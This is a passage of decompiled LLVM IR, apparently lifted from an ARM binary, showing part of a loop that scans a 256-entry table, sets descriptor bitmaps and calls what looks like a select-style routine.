dec_label_pc_ec38:                                ; preds = %dec_label_pc_ec30
  %v1_ec38 = add i32 %v0_ebe8, 8
  %v2_ec38 = inttoptr i32 %v1_ec38 to i32*
  %v3_ec38 = load i32, i32* %v2_ec38, align 4
  %v5_ec50 = call i32 @llvm.bswap.i32(i32 %v3_ec38)
  %v1_ec54 = add i32 %v5_ec50, -1
  store i32 %v1_ec54, i32* %r2.global-to-local, align 4
  %v1_ec58 = and i32 %v1_ec54, 16711680
  store i32 %v1_ec58, i32* %r0.global-to-local, align 4
  %v3_ec5c = udiv i32 %v1_ec54, 16777216
  %v4_ec64 = udiv i32 %v1_ec58, 256
  %v5_ec64 = or i32 %v4_ec64, %v3_ec5c
  %v1_ec60 = mul i32 %v1_ec54, 256
  %v4_ec68 = and i32 %v1_ec60, 16711680
  %v5_ec68 = or i32 %v5_ec64, %v4_ec68
  store i32 %v5_ec68, i32* %r3.global-to-local, align 4
  store i32 %v2_e848, i32* %r1.global-to-local, align 4
  %v3_ec70 = load i32, i32* %v2_ec70, align 4
  store i32 %v3_ec70, i32* @lr, align 4
  %v5_ec74 = call i32 @llvm.bswap.i32(i32 %v1_ec54)
  store i32 %v5_ec74, i32* %r3.global-to-local, align 4
  %v3_ec78 = icmp uge i32 %v5_ec74, %v3_ec70
  store i1 %v3_ec78, i1* %cpsr_c.global-to-local, align 1
  %v9_ec78 = icmp eq i32 %v5_ec74, %v3_ec70
  store i1 %v9_ec78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ec78, label %dec_label_pc_ec80, label %dec_label_pc_eb78

dec_label_pc_ec80:                                ; preds = %dec_label_pc_ec38
  %v0_ec80 = load i32, i32* @r5, align 4
  %v2_ec80 = icmp ugt i32 %v0_ec80, 254
  store i1 %v2_ec80, i1* %cpsr_c.global-to-local, align 1
  %v7_ec80 = icmp eq i32 %v0_ec80, 255
  store i1 %v7_ec80, i1* %cpsr_z.global-to-local, align 1
  %v8_ec84 = icmp sgt i32 %v0_ec80, 255
  br i1 %v8_ec84, label %dec_label_pc_ed00, label %dec_label_pc_ec88

dec_label_pc_ec88:                                ; preds = %dec_label_pc_ec80
  %v2_ec90 = load i32, i32* @global_var_20a68.133, align 4
  store i32 %v2_ec90, i32* %r1.global-to-local, align 4
  %v3_ec94 = mul i32 %v0_ec80, 256
  store i32 %v3_ec94, i32* %r2.global-to-local, align 4
  %v2_ec98 = mul i32 %v0_ec80, 288
  store i32 %v2_ec98, i32* %r3.global-to-local, align 4
  %v2_ec9c = add i32 %v2_ec90, %v2_ec98
  store i32 %v2_ec9c, i32* @r0, align 4
  %v1_eca0 = add i32 %v2_ec9c, 12
  %v2_eca0 = inttoptr i32 %v1_eca0 to i32*
  %v3_eca0 = load i32, i32* %v2_eca0, align 4
  store i32 %v3_eca0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eca4 = icmp eq i32 %v3_eca0, 0
  store i1 %v2_eca4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eca4, label %dec_label_pc_ece8, label %dec_label_pc_ecc4.preheader

dec_label_pc_ecc4.preheader:                      ; preds = %dec_label_pc_ec88
  %v2_eca8 = add i32 %v0_ec80, 1
  %v2_ecb0 = and i32 %v2_eca8, 134217728
  %v3_ecb0 = icmp ne i32 %v2_ecb0, 0
  store i1 %v3_ecb0, i1* %cpsr_c.global-to-local, align 1
  %v3_ecb4 = mul i32 %v2_eca8, 288
  %v3_ecb8 = add i32 %v2_ec90, %v3_ecb4
  store i32 %v3_ecb8, i32* %r3.global-to-local, align 4
  store i32 %v0_ec80, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ecc4

dec_label_pc_ecc4:                                ; preds = %dec_label_pc_ecc4.preheader, %dec_label_pc_ecd0
  %v0_ecd0 = phi i32 [ %v3_ecb8, %dec_label_pc_ecc4.preheader ], [ %v1_ecdc, %dec_label_pc_ecd0 ]
  %v0_ecc4 = phi i32 [ %v0_ec80, %dec_label_pc_ecc4.preheader ], [ %v1_ecc4, %dec_label_pc_ecd0 ]
  %v1_ecc4 = add i32 %v0_ecc4, 1
  store i32 %v1_ecc4, i32* %r2.global-to-local, align 4
  %v7_ecc8 = icmp eq i32 %v1_ecc4, 256
  br i1 %v7_ecc8, label %dec_label_pc_ed00.loopexit, label %dec_label_pc_ecd0

dec_label_pc_ecd0:                                ; preds = %dec_label_pc_ecc4
  store i32 %v0_ecd0, i32* @r0, align 4
  %v1_ecd4 = add i32 %v0_ecd0, 12
  %v2_ecd4 = inttoptr i32 %v1_ecd4 to i32*
  %v3_ecd4 = load i32, i32* %v2_ecd4, align 4
  %v2_ecd8 = icmp eq i32 %v3_ecd4, 0
  %v1_ecdc = add i32 %v0_ecd0, 288
  store i32 %v1_ecdc, i32* %r3.global-to-local, align 4
  br i1 %v2_ecd8, label %dec_label_pc_ece4, label %dec_label_pc_ecc4

dec_label_pc_ece4:                                ; preds = %dec_label_pc_ecd0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ecc4, i32* @r5, align 4
  br label %dec_label_pc_ece8

dec_label_pc_ece8:                                ; preds = %dec_label_pc_ec88, %dec_label_pc_ece4
  %v1_ecf0 = phi i32 [ %v2_ec9c, %dec_label_pc_ec88 ], [ %v0_ecd0, %dec_label_pc_ece4 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ece8 = icmp eq i32 %v1_ecf0, 0
  store i1 %v2_ece8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ece8, label %dec_label_pc_ed00, label %dec_label_pc_ecf0

dec_label_pc_ecf0:                                ; preds = %dec_label_pc_ece8
  %v2_ecf0 = add i32 %v1_ecf0, 16
  %v3_ecf0 = inttoptr i32 %v2_ecf0 to i32*
  store i32 %v3_ec70, i32* %v3_ecf0, align 4
  %v0_ecf4 = load i32, i32* %ip.global-to-local, align 4
  %v1_ecf4 = trunc i32 %v0_ecf4 to i16
  %v2_ecf4 = load i32, i32* @r0, align 4
  %v3_ecf4 = add i32 %v2_ecf4, 20
  %v4_ecf4 = inttoptr i32 %v3_ecf4 to i16*
  store i16 %v1_ecf4, i16* %v4_ecf4, align 2
  %v0_ecf8 = call i32 @function_e324()
  store i32 %v0_ecf8, i32* %r0.global-to-local, align 4
  %v1_eb7c.pre.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_eb78

dec_label_pc_ed00.loopexit:                       ; preds = %dec_label_pc_ecc4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ed00

dec_label_pc_ed00:                                ; preds = %dec_label_pc_ece8, %dec_label_pc_ec80, %dec_label_pc_ebac, %dec_label_pc_eb78, %dec_label_pc_ed00.loopexit
  store i32 0, i32* %stack_var_-224, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1676, i32* %ip.global-to-local, align 4
  %v2_ed20513 = load i32, i32* @sp, align 4
  %v3_ed20514 = add i32 %v2_ed20513, 1676
  %v4_ed20515 = inttoptr i32 %v3_ed20514 to i32*
  store i32 0, i32* %v4_ed20515, align 4
  br label %dec_label_pc_ed0c.dec_label_pc_ed0c_crit_edge

dec_label_pc_ed0c.dec_label_pc_ed0c_crit_edge:    ; preds = %dec_label_pc_ed00, %dec_label_pc_ed0c.dec_label_pc_ed0c_crit_edge
  %v0_ed0c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_ed10 = add i32 %v0_ed0c.pre, 4
  store i32 %v1_ed10, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_ed18 = add i32 %v0_ed0c.pre, 1672
  store i32 %v1_ed18, i32* %ip.global-to-local, align 4
  %v7_ed1c = icmp eq i32 %v1_ed10, 128
  %v2_ed20 = load i32, i32* @sp, align 4
  %v3_ed20 = add i32 %v2_ed20, %v1_ed18
  %v4_ed20 = inttoptr i32 %v3_ed20 to i32*
  store i32 0, i32* %v4_ed20, align 4
  br i1 %v7_ed1c, label %dec_label_pc_ed28, label %dec_label_pc_ed0c.dec_label_pc_ed0c_crit_edge

dec_label_pc_ed28:                                ; preds = %dec_label_pc_ed0c.dec_label_pc_ed0c_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_ed28 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_ed28, i32* %stack_var_-352, align 4
  %v1_ed34516 = add i32 %v0_ed28, 8
  store i32 %v1_ed34516, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_ed3c517 = add i32 %v0_ed28, 1548
  store i32 %v1_ed3c517, i32* @lr, align 4
  %v7_ed40518 = icmp eq i32 %v1_ed34516, 128
  %v2_ed44519 = load i32, i32* @sp, align 4
  %v3_ed44520 = add i32 %v2_ed44519, %v1_ed3c517
  %v4_ed44521 = inttoptr i32 %v3_ed44520 to i32*
  store i32 0, i32* %v4_ed44521, align 4
  br i1 %v7_ed40518, label %dec_label_pc_ed4c, label %dec_label_pc_ed30.dec_label_pc_ed30_crit_edge

dec_label_pc_ed30.dec_label_pc_ed30_crit_edge:    ; preds = %dec_label_pc_ed28, %dec_label_pc_ed30.dec_label_pc_ed30_crit_edge
  %v0_ed30.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_ed34 = add i32 %v0_ed30.pre, 4
  store i32 %v1_ed34, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_ed3c = add i32 %v0_ed30.pre, 1544
  store i32 %v1_ed3c, i32* @lr, align 4
  %v7_ed40 = icmp eq i32 %v1_ed34, 128
  %v2_ed44 = load i32, i32* @sp, align 4
  %v3_ed44 = add i32 %v2_ed44, %v1_ed3c
  %v4_ed44 = inttoptr i32 %v3_ed44 to i32*
  store i32 0, i32* %v4_ed44, align 4
  br i1 %v7_ed40, label %dec_label_pc_ed4c, label %dec_label_pc_ed30.dec_label_pc_ed30_crit_edge

dec_label_pc_ed4c:                                ; preds = %dec_label_pc_ed30.dec_label_pc_ed30_crit_edge, %dec_label_pc_ed28
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_ed4c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_ed4c, i32* @r6, align 4
  store i32 %v0_ed4c, i32* @r5, align 4
  store i32 %v0_ed4c, i32* %stack_var_-52, align 4
  br label %dec_label_pc_eda8

dec_label_pc_ed5c:                                ; preds = %dec_label_pc_edd8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_edc4, i1* %cpsr_z.global-to-local, align 1
  %v1_ee48 = add i32 %v2_edbc, 4
  %v2_ee48 = inttoptr i32 %v1_ee48 to i32*
  %v3_ee48 = load i32, i32* %v2_ee48, align 4
  br i1 %v7_edc4, label %dec_label_pc_ee48, label %dec_label_pc_ed64

dec_label_pc_ed64:                                ; preds = %dec_label_pc_ed5c
  store i32 %v3_ee48, i32* %ip.global-to-local, align 4
  %v3_ed68 = udiv i32 %v3_ee48, 32
  store i32 %v2_ee54, i32* %r0.global-to-local, align 4
  %v3_ed70 = mul nuw nsw i32 %v3_ed68, 4
  %v2_ed74 = add i32 %v3_ed70, %v2_ee54
  store i32 %v2_ed74, i32* %r3.global-to-local, align 4
  %v1_ed78 = add i32 %v2_ed74, -184
  %v2_ed78 = inttoptr i32 %v1_ed78 to i32*
  %v3_ed78 = load i32, i32* %v2_ed78, align 4
  %v1_ed7c = urem i32 %v3_ee48, 32
  store i32 %v1_ed7c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_ed84 = shl i32 1, %v1_ed7c
  %v8_ed84 = or i32 %v3_ed78, %v7_ed84
  store i32 %v8_ed84, i32* %r2.global-to-local, align 4
  store i32 %v8_ed84, i32* %v2_ed78, align 4
  %v0_ed8c = load i32, i32* @r6, align 4
  %v1_ed8c = load i32, i32* %ip.global-to-local, align 4
  %v3_ed8c = icmp uge i32 %v0_ed8c, %v1_ed8c
  store i1 %v3_ed8c, i1* %cpsr_c.global-to-local, align 1
  %v9_ed8c = icmp eq i32 %v0_ed8c, %v1_ed8c
  store i1 %v9_ed8c, i1* %cpsr_z.global-to-local, align 1
  %v5_ed90 = icmp slt i32 %v0_ed8c, %v1_ed8c
  br i1 %v5_ed90, label %bb409, label %bb410

bb409:                                            ; preds = %dec_label_pc_ed64
  store i32 %v1_ed8c, i32* @r6, align 4
  br label %bb410

bb410:                                            ; preds = %.thread75, %bb416, %bb414, %bb418, %dec_label_pc_ee3c, %dec_label_pc_ed64, %bb409
  %v3_ed94 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_ed94, i32* %r3.global-to-local, align 4
  %v1_ed98 = add i32 %v3_ed94, 1
  store i32 %v1_ed98, i32* %r2.global-to-local, align 4
  %v2_ed9c = icmp ugt i32 %v1_ed98, 254
  store i1 %v2_ed9c, i1* %cpsr_c.global-to-local, align 1
  %v7_ed9c = icmp eq i32 %v1_ed98, 255
  store i1 %v7_ed9c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ed98, i32* %stack_var_-52, align 4
  %v8_eda4 = icmp sgt i32 %v1_ed98, 255
  br i1 %v8_eda4, label %dec_label_pc_ee78, label %dec_label_pc_eda8

dec_label_pc_eda8:                                ; preds = %bb410, %dec_label_pc_ed4c
  %v0_edb4 = phi i32 [ %v1_ed98, %bb410 ], [ %v0_ed4c, %dec_label_pc_ed4c ]
  store i32 ptrtoint (i32* @global_var_20a68.133 to i32), i32* %r0.global-to-local, align 4
  %v3_edac = mul i32 %v0_edb4, 256
  store i32 %v3_edac, i32* %r3.global-to-local, align 4
  %v2_edb0 = load i32, i32* @global_var_20a68.133, align 4
  store i32 %v2_edb0, i32* %r1.global-to-local, align 4
  %v2_edb8 = mul i32 %v0_edb4, 288
  store i32 %v2_edb8, i32* %r2.global-to-local, align 4
  %v2_edbc = add i32 %v2_edb0, %v2_edb8
  store i32 %v2_edbc, i32* @r4, align 4
  %v1_edc0 = add i32 %v2_edbc, 12
  %v2_edc0 = inttoptr i32 %v1_edc0 to i32*
  %v3_edc0 = load i32, i32* %v2_edc0, align 4
  store i32 %v3_edc0, i32* %ip.global-to-local, align 4
  %v2_edc4 = icmp ne i32 %v3_edc0, 0
  store i1 %v2_edc4, i1* %cpsr_c.global-to-local, align 1
  %v7_edc4 = icmp eq i32 %v3_edc0, 1
  store i1 %v7_edc4, i1* %cpsr_z.global-to-local, align 1
  %v2_edc8 = xor i1 %v2_edc4, true
  %v3_edc8 = or i1 %v7_edc4, %v2_edc8
  br i1 %v3_edc8, label %bb411, label %bb412

bb411:                                            ; preds = %dec_label_pc_eda8
  store i32 5, i32* %r1.global-to-local, align 4
  br label %bb412

bb412:                                            ; preds = %dec_label_pc_eda8, %bb411
  %v1_ede8215 = phi i32 [ %v2_edb0, %dec_label_pc_eda8 ], [ 5, %bb411 ]
  %v2_edcc = xor i1 %v7_edc4, true
  %v3_edcc = and i1 %v2_edc4, %v2_edcc
  br i1 %v3_edcc, label %bb413, label %bb414

bb413:                                            ; preds = %bb412
  store i32 30, i32* %r1.global-to-local, align 4
  br label %bb414

bb414:                                            ; preds = %bb412, %bb413
  %v1_ede8 = phi i32 [ %v1_ede8215, %bb412 ], [ 30, %bb413 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_edd0 = icmp eq i32 %v3_edc0, 0
  store i1 %v2_edd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_edd0, label %bb410, label %dec_label_pc_edd8

dec_label_pc_edd8:                                ; preds = %bb414
  store i32 ptrtoint (i32* @global_var_1ea18.121 to i32), i32* %r2.global-to-local, align 4
  %v2_eddc = load i32, i32* @global_var_1ea18.121, align 4
  store i32 %v2_eddc, i32* %r3.global-to-local, align 4
  %v1_ede0 = add i32 %v2_edbc, 8
  %v2_ede0 = inttoptr i32 %v1_ede0 to i32*
  %v3_ede0 = load i32, i32* %v2_ede0, align 4
  store i32 %v3_ede0, i32* %r2.global-to-local, align 4
  %v2_ede4 = sub i32 %v2_eddc, %v3_ede0
  store i32 %v2_ede4, i32* %r3.global-to-local, align 4
  %v3_ede8 = icmp uge i32 %v2_ede4, %v1_ede8
  store i1 %v3_ede8, i1* %cpsr_c.global-to-local, align 1
  %v9_ede8 = icmp eq i32 %v2_ede4, %v1_ede8
  store i1 %v9_ede8, i1* %cpsr_z.global-to-local, align 1
  %v2_edec = xor i1 %v3_ede8, true
  %v3_edec = or i1 %v9_ede8, %v2_edec
  br i1 %v3_edec, label %dec_label_pc_ed5c, label %dec_label_pc_edf0

dec_label_pc_edf0:                                ; preds = %dec_label_pc_edd8
  %v1_edf0 = add i32 %v2_edbc, 4
  %v2_edf0 = inttoptr i32 %v1_edf0 to i32*
  %v3_edf0 = load i32, i32* %v2_edf0, align 4
  store i32 %v3_edf0, i32* %r0.global-to-local, align 4
  %v1_edf4 = call i32 @function_10dd8(i32 %v3_edf0)
  store i32 %v1_edf4, i32* %r0.global-to-local, align 4
  %v0_edf8 = load i32, i32* @r4, align 4
  %v1_edf8 = add i32 %v0_edf8, 12
  %v2_edf8 = inttoptr i32 %v1_edf8 to i32*
  %v3_edf8 = load i32, i32* %v2_edf8, align 4
  store i32 %v3_edf8, i32* %r3.global-to-local, align 4
  %v2_edfc = icmp ugt i32 %v3_edf8, 1
  store i1 %v2_edfc, i1* %cpsr_c.global-to-local, align 1
  %v7_edfc = icmp eq i32 %v3_edf8, 2
  store i1 %v7_edfc, i1* %cpsr_z.global-to-local, align 1
  %v2_ee00 = xor i1 %v2_edfc, true
  %v3_ee00 = or i1 %v7_edfc, %v2_ee00
  br i1 %v3_ee00, label %bb415, label %.thread301

.thread301:                                       ; preds = %dec_label_pc_edf0
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_ee08298302 = add i32 %v0_edf8, 4
  %v3_ee08299303 = inttoptr i32 %v2_ee08298302 to i32*
  store i32 -1, i32* %v3_ee08299303, align 4
  br label %bb416

bb415:                                            ; preds = %dec_label_pc_edf0
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_ee08295 = add i32 %v0_edf8, 4
  %v3_ee08296 = inttoptr i32 %v2_ee08295 to i32*
  store i32 -1, i32* %v3_ee08296, align 4
  %v4_ee0c = load i32, i32* %r3.global-to-local, align 4
  %v5_ee0c = load i32, i32* @r4, align 4
  %v6_ee0c = add i32 %v5_ee0c, 12
  %v7_ee0c = inttoptr i32 %v6_ee0c to i32*
  store i32 %v4_ee0c, i32* %v7_ee0c, align 4
  %v4_ee10 = load i32, i32* %r3.global-to-local, align 4
  %v5_ee10 = trunc i32 %v4_ee10 to i8
  %v6_ee10 = load i32, i32* @r4, align 4
  %v7_ee10 = add i32 %v6_ee10, 284
  %v8_ee10 = inttoptr i32 %v7_ee10 to i8*
  store i8 %v5_ee10, i8* %v8_ee10, align 1
  %v0_ee14.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_ee14.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb416

bb416:                                            ; preds = %.thread301, %bb415
  %v1_ee14 = phi i1 [ %v1_ee14.pre, %bb415 ], [ %v2_edfc, %.thread301 ]
  %v0_ee14 = phi i1 [ %v0_ee14.pre, %bb415 ], [ false, %.thread301 ]
  %v2_ee14 = xor i1 %v1_ee14, true
  %v3_ee14 = or i1 %v0_ee14, %v2_ee14
  br i1 %v3_ee14, label %bb410, label %dec_label_pc_ee18

dec_label_pc_ee18:                                ; preds = %bb416
  %v0_ee18 = load i32, i32* @r4, align 4
  %v1_ee18 = add i32 %v0_ee18, 284
  %v2_ee18 = inttoptr i32 %v1_ee18 to i8*
  %v3_ee18 = load i8, i8* %v2_ee18, align 1
  %v4_ee18 = zext i8 %v3_ee18 to i32
  %v1_ee1c = add nuw nsw i32 %v4_ee18, 1
  %v1_ee20 = urem i32 %v1_ee1c, 256
  store i32 %v1_ee20, i32* %r3.global-to-local, align 4
  %v2_ee24 = icmp ugt i32 %v1_ee20, 9
  store i1 %v2_ee24, i1* %cpsr_c.global-to-local, align 1
  %v7_ee24 = icmp eq i32 %v1_ee20, 10
  store i1 %v7_ee24, i1* %cpsr_z.global-to-local, align 1
  %v1_ee28 = trunc i32 %v1_ee1c to i8
  store i8 %v1_ee28, i8* %v2_ee18, align 1
  %v0_ee2c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ee2c, label %.thread75, label %dec_label_pc_ee3c

.thread75:                                        ; preds = %dec_label_pc_ee18
  %v1_ee2c = load i32, i32* %r3.global-to-local, align 4
  %v2_ee2c = add i32 %v1_ee2c, -10
  store i32 %v2_ee2c, i32* %r3.global-to-local, align 4
  %v2_ee30 = load i32, i32* @r4, align 4
  %v3_ee30 = add i32 %v2_ee30, 12
  %v4_ee30 = inttoptr i32 %v3_ee30 to i32*
  store i32 %v2_ee2c, i32* %v4_ee30, align 4
  %v1_ee34 = load i32, i32* %r3.global-to-local, align 4
  %v2_ee34 = trunc i32 %v1_ee34 to i8
  %v3_ee34 = load i32, i32* @r4, align 4
  %v4_ee34 = add i32 %v3_ee34, 284
  %v5_ee34 = inttoptr i32 %v4_ee34 to i8*
  store i8 %v2_ee34, i8* %v5_ee34, align 1
  %v0_ee38.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ee38.pr.pr, label %bb410, label %dec_label_pc_ee3c

dec_label_pc_ee3c:                                ; preds = %dec_label_pc_ee18, %.thread75
  %v0_ee3c = load i32, i32* @r4, align 4
  store i32 %v0_ee3c, i32* @r0, align 4
  %v0_ee40 = call i32 @function_e324()
  store i32 %v0_ee40, i32* %r0.global-to-local, align 4
  br label %bb410

dec_label_pc_ee48:                                ; preds = %dec_label_pc_ed5c
  store i32 %v3_ee48, i32* %r0.global-to-local, align 4
  %v3_ee4c = udiv i32 %v3_ee48, 32
  %v3_ee50 = mul nuw nsw i32 %v3_ee4c, 4
  store i32 %v2_ee54, i32* @lr, align 4
  %v2_ee58 = add i32 %v3_ee50, %v2_ee54
  store i32 %v2_ee58, i32* %r3.global-to-local, align 4
  %v1_ee5c = add i32 %v2_ee58, -312
  %v2_ee5c = inttoptr i32 %v1_ee5c to i32*
  %v3_ee5c = load i32, i32* %v2_ee5c, align 4
  %v1_ee60 = urem i32 %v3_ee48, 32
  store i32 %v1_ee60, i32* %r1.global-to-local, align 4
  %v7_ee64 = shl i32 1, %v1_ee60
  %v8_ee64 = or i32 %v3_ee5c, %v7_ee64
  store i32 %v8_ee64, i32* %r2.global-to-local, align 4
  %v0_ee68 = load i32, i32* @r5, align 4
  %v3_ee68 = icmp uge i32 %v0_ee68, %v3_ee48
  store i1 %v3_ee68, i1* %cpsr_c.global-to-local, align 1
  %v9_ee68 = icmp eq i32 %v0_ee68, %v3_ee48
  store i1 %v9_ee68, i1* %cpsr_z.global-to-local, align 1
  %v5_ee6c = icmp slt i32 %v0_ee68, %v3_ee48
  br i1 %v5_ee6c, label %bb417, label %bb418

bb417:                                            ; preds = %dec_label_pc_ee48
  store i32 %v3_ee48, i32* @r5, align 4
  br label %bb418

bb418:                                            ; preds = %dec_label_pc_ee48, %bb417
  store i32 %v8_ee64, i32* %v2_ee5c, align 4
  br label %bb410

dec_label_pc_ee78:                                ; preds = %bb410
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %stack_var_-68, align 4
  %v0_ee84 = load i32, i32* @r5, align 4
  %v1_ee84 = load i32, i32* @r6, align 4
  %v3_ee84 = icmp uge i32 %v0_ee84, %v1_ee84
  store i1 %v3_ee84, i1* %cpsr_c.global-to-local, align 1
  %v9_ee84 = icmp eq i32 %v0_ee84, %v1_ee84
  store i1 %v9_ee84, i1* %cpsr_z.global-to-local, align 1
  %v5_ee88 = icmp slt i32 %v0_ee84, %v1_ee84
  %storemerge155 = select i1 %v5_ee88, i32 %v1_ee84, i32 %v0_ee84
  store i32 %v2_ee9c, i32* %ip.global-to-local, align 4
  store i32 %v2_eea0, i32* %r1.global-to-local, align 4
  store i32 %v2_eea4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_eeac = add i32 %storemerge155, 1
  store i32 %v1_eeac, i32* %r0.global-to-local, align 4
  %v5_eeb8 = call i32 @function_10afc(i32 %v1_eeac, i32 %v2_eea0, i32 %v2_eea4, i32 0, i32 %v2_ee9c)
  %v0_eebc = load i32, i32* @r4, align 4
  store i32 %v0_eebc, i32* %r0.global-to-local, align 4
  %v1_eec0 = inttoptr i32 %v0_eebc to i32*
  %v2_eec0 = call i32 @function_10a58(i32* %v1_eec0)
  store i32 %v2_eec0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ea18.121 to i32), i32* @lr, align 4
  %v0_eec8 = load i32, i32* @r4, align 4
  store i32 %v0_eec8, i32* %stack_var_-52, align 4
  store i32 %v2_eec0, i32* @global_var_1ea18.121, align 4
  br label %dec_label_pc_eed0

dec_label_pc_eed0:                                ; preds = %dec_label_pc_f038, %dec_label_pc_ee78
  %v0_eedc = phi i32 [ %v1_f03c, %dec_label_pc_f038 ], [ %v0_eec8, %dec_label_pc_ee78 ]
  store i32 ptrtoint (i32* @global_var_20a68.133 to i32), i32* %r0.global-to-local, align 4
  %v3_eed4 = mul i32 %v0_eedc, 256
  store i32 %v3_eed4, i32* %r3.global-to-local, align 4
  %v2_eed8 = load i32, i32* @global_var_20a68.133, align 4
  store i32 %v2_eed8, i32* %r1.global-to-local, align 4
  %v2_eee0 = mul i32 %v0_eedc, 288
  store i32 %v2_eee0, i32* %r2.global-to-local, align 4
  %v2_eee4 = add i32 %v2_eed8, %v2_eee0
  store i32 %v2_eee4, i32* @r6, align 4
  %v1_eee8 = add i32 %v2_eee4, 4
  %v2_eee8 = inttoptr i32 %v1_eee8 to i32*
  %v3_eee8 = load i32, i32* %v2_eee8, align 4
  store i32 %v3_eee8, i32* %r0.global-to-local, align 4
  %v2_eeec = icmp eq i32 %v3_eee8, -1
  store i1 %v2_eeec, i1* %cpsr_c.global-to-local, align 1
  %v7_eeec = icmp eq i32 %v3_eee8, -1
  store i1 %v7_eeec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eeec, label %dec_label_pc_f038, label %dec_label_pc_eef4

dec_label_pc_eef4:                                ; preds = %dec_label_pc_eed0
  %v3_eef4 = udiv i32 %v3_eee8, 32
  store i32 %v2_ee54, i32* %r1.global-to-local, align 4
  %v3_eefc = mul nuw nsw i32 %v3_eef4, 4
  store i32 %v3_eefc, i32* @ip, align 4
  %v2_ef00 = add i32 %v3_eefc, %v2_ee54
  store i32 %v2_ef00, i32* %r2.global-to-local, align 4
  %v1_ef04 = add i32 %v2_ef00, -312
  %v2_ef04 = inttoptr i32 %v1_ef04 to i32*
  %v3_ef04 = load i32, i32* %v2_ef04, align 4
  %v1_ef08 = urem i32 %v3_eee8, 32
  store i32 %v1_ef08, i32* %r1.global-to-local, align 4
  %v2_ef0c = add nsw i32 %v1_ef08, -1
  %v3_ef0c = shl i32 1, %v2_ef0c
  %v4_ef0c = and i32 %v3_ef04, %v3_ef0c
  %v5_ef0c = icmp ne i32 %v4_ef0c, 0
  store i1 %v5_ef0c, i1* %cpsr_c.global-to-local, align 1
  %v6_ef0c = lshr i32 %v3_ef04, %v1_ef08
  store i32 %v6_ef0c, i32* %r3.global-to-local, align 4
  %v1_ef10 = urem i32 %v6_ef0c, 2
  %v2_ef10 = icmp eq i32 %v1_ef10, 0
  store i1 %v2_ef10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef10, label %dec_label_pc_ef18, label %dec_label_pc_fa40

dec_label_pc_ef18:                                ; preds = %dec_label_pc_eef4, %dec_label_pc_faec
  %v1_ef24 = phi i32 [ %v1_ef08, %dec_label_pc_eef4 ], [ %v1_ef24.pre, %dec_label_pc_faec ]
  %v0_ef1c = phi i32 [ %v3_eefc, %dec_label_pc_eef4 ], [ %v0_ef1c.pre, %dec_label_pc_faec ]
  store i32 %v2_ee54, i32* @lr, align 4
  %v2_ef1c = add i32 %v0_ef1c, %v2_ee54
  store i32 %v2_ef1c, i32* %r2.global-to-local, align 4
  %v1_ef20 = add i32 %v2_ef1c, -184
  %v2_ef20 = inttoptr i32 %v1_ef20 to i32*
  %v3_ef20 = load i32, i32* %v2_ef20, align 4
  %v2_ef24 = add i32 %v1_ef24, -1
  %v3_ef24 = shl i32 1, %v2_ef24
  %v4_ef24 = and i32 %v3_ef20, %v3_ef24
  %v5_ef24 = icmp ne i32 %v4_ef24, 0
  store i1 %v5_ef24, i1* %cpsr_c.global-to-local, align 1
  %v6_ef24 = lshr i32 %v3_ef20, %v1_ef24
  store i32 %v6_ef24, i32* %r3.global-to-local, align 4
  %v1_ef28 = urem i32 %v6_ef24, 2
  %v2_ef28 = icmp eq i32 %v1_ef28, 0
  store i1 %v2_ef28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef28, label %dec_label_pc_f038, label %dec_label_pc_ef30.preheader

dec_label_pc_ef30.preheader:                      ; preds = %dec_label_pc_ef18
  %v0_ef30176 = load i32, i32* @r6, align 4
  %v1_ef30177 = add i32 %v0_ef30176, 12
  %v2_ef30178 = inttoptr i32 %v1_ef30177 to i32*
  %v3_ef30179 = load i32, i32* %v2_ef30178, align 4
  store i32 %v3_ef30179, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
